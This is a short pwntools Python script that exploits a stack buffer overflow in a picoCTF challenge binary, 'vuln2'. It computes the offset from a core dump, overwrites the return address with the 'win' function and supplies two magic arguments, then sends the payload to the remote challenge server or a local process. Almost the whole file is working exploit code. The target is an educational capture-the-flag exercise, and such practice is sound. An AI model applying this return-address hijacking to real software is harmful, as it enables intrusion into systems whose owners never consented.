from pwn import *

elf = context.binary = ELF('./vuln2', checksec=False)
host, port = 'saturn.picoctf.net', 56132

# To get core file
# p = process(elf.path)
# p.sendline(cyclic(200))   # send padding to cause crash
# p.wait()

# Check your core_pattern path `cat /proc/sys/kernel/core_pattern`
core = Coredump('/tmp/core/core.vuln2.2250.1707699716')

payload = flat([
    { cyclic_find(core.eip): elf.symbols.win }, # offset:address (return address $eip)
    elf.symbols.main,                           # call function with parameters (included $ebp)
    0xcafef00d,                                 # arg1
    0xf00df00d                                  # arg2
])

if args.REMOTE:
    p = remote(host, port)
else:
    p = process(elf.path)

p.recvline()
p.sendline(payload)

p.interactive()
